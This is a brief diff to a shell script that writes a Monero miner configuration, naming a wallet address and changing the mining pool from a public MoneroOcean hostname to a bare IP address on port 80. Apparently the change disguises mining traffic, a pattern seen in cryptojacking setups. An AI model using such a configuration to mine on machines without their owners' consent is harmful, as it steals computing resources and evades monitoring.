@@ -41,7 +41,7 @@ cat > config.json <<EOF
     },
     "pools": [
         {
-            "url": "gulf.moneroocean.stream:10128",
+            "url": "161.248.146.81:80",
             "user": "84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z",
             "pass": "x",
             "keepalive": true,
